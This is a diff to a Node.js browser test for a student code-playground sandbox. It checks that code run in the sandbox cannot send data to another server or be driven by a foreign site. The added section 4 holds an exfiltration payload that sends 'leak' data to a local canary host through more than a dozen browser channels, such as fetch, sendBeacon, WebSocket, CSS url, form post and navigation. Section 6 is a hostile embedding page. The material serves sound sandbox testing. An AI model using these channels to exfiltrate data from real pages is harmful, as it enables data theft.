@@ -4,11 +4,13 @@
 // Runs "attacker" student code in /playground and asserts every escape attempt fails.
 import { spawn } from 'node:child_process';
 import { mkdtempSync, writeFileSync } from 'node:fs';
+import { createServer } from 'node:http';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
 const BASE = process.env.WEB_URL ?? 'http://localhost:3000';
 const OUT = process.argv[2];
+const SANDBOX_URL = process.env.SANDBOX_URL ?? 'http://127.0.0.1:3100';
 const CHROME = process.env.CHROME_PATH ?? 'C:/Program Files/Google/Chrome/Application/chrome.exe';
 const port = 9800 + Math.floor(Math.random() * 100);
 const chrome = spawn(CHROME, [
@@ -149,6 +151,81 @@ await sleep(4000);
 await clickRun();
 await sleep(2500);
 check((await consoleText()).includes('QAYTA'), 'a fresh run works after the timeout');
+
+// ---- 4. Exfiltration: no channel reaches another server ------------------------
+// A canary on an IP literal must not receive a single request. Control request first.
+const hits = [];
+const canary = createServer((req, res) => {
+  hits.push(`${req.method} ${req.url}`);
+  if (req.url === '/host.html') {
+    // A foreign page (another site) that tries to embed and drive the runner (section 6).
+    res.setHeader('content-type', 'text/html');
+    res.end(`<script>window.__msgs = [];
+addEventListener('message', (e) => window.__msgs.push(e.data && e.data.type));
+const f = document.createElement('iframe');
+f.src = ${JSON.stringify(SANDBOX_URL + '/runner.html')};
+f.onload = () => f.contentWindow.postMessage({ type: 'wd:run', runId: 'evil-run', files: [{ path: 'index.html', content: '<script>console.log(1)<\\/script>' }] }, '*');
+document.body.appendChild(f);</script>`);
+    return;
+  }
+  res.setHeader('access-control-allow-origin', '*');
+  res.end('canary');
+});
+canary.on('upgrade', (req, socket) => {
+  hits.push(`UPGRADE ${req.url}`);
+  socket.destroy();
+});
+await new Promise((r) => canary.listen(0, '127.0.0.1', r));
+const CANARY = `http://127.0.0.1:${canary.address().port}`;
+await fetch(`${CANARY}/control`);
+check(hits.join() === 'GET /control', 'canary control request is received');
+hits.length = 0;
+
+const exfil = `
+const C = ${JSON.stringify(CANARY)};
+fetch(C + '/fetch').catch(() => {});
+try { const x = new XMLHttpRequest(); x.open('GET', C + '/xhr'); x.send(); } catch {}
+try { navigator.sendBeacon(C + '/beacon', 'leak'); } catch {}
+try { new EventSource(C + '/sse'); } catch {}
+try { new WebSocket(C.replace('http', 'ws') + '/ws'); } catch {}
+try { new Worker(C + '/worker.js'); } catch {}
+const img = new Image(); img.src = C + '/img';
+const s = document.createElement('style'); s.textContent = 'body{background:url(' + C + '/css)}'; document.head.appendChild(s);
+const l = document.createElement('link'); l.rel = 'prefetch'; l.href = C + '/prefetch'; document.head.appendChild(l);
+const fr = document.createElement('iframe'); fr.src = C + '/iframe'; document.body.appendChild(fr);
+const f = document.createElement('form'); f.action = C + '/form'; f.method = 'post'; document.body.appendChild(f);
+try { f.submit(); } catch {}
+try { window.open(C + '/popup'); } catch {}
+setTimeout(() => { location.href = C + '/navigate?leak=1'; }, 300);
+console.log('EXFIL_DONE');
+`;
+await loadProject([
+  { path: 'index.html', content: '<p>exfil</p><script src="app.js"></script>' },
+  { path: 'app.js', content: exfil },
+]);
+await clickRun();
+await sleep(4000);
+check((await consoleText()).includes('EXFIL_DONE'), 'exfiltration attempts actually ran');
+check(hits.length === 0, `no request reached the canary (${hits.join(', ') || 'none'})`);
+
+// ---- 5. Busy loop after load: the web app stays responsive ---------------------
+await loadProject([
+  {
+    path: 'index.html',
+    content: '<script>console.log("BOSHLANDI"); setTimeout(() => { for (;;) {} }, 300);</script>',
+  },
+]);
+await clickRun();
+await sleep(2500);
+const alive2 = await Promise.race([evaluate('2 + 2'), sleep(3000).then(() => 'frozen')]);
+check(alive2 === 4, 'web app stays responsive during a loop that starts after load');
+
+// ---- 6. A foreign site cannot embed or drive the runner ------------------------
+await send('Page.navigate', { url: `${CANARY}/host.html` });
+await sleep(3000);
+const foreign = await evaluate('JSON.stringify(window.__msgs)');
+check(foreign === '[]', `runner sends nothing to a foreign embedder (${foreign})`);
+canary.close();
 
 const shot = await send('Page.captureScreenshot', { format: 'png' });
 if (OUT) writeFileSync(OUT, Buffer.from(shot.result.data, 'base64'));
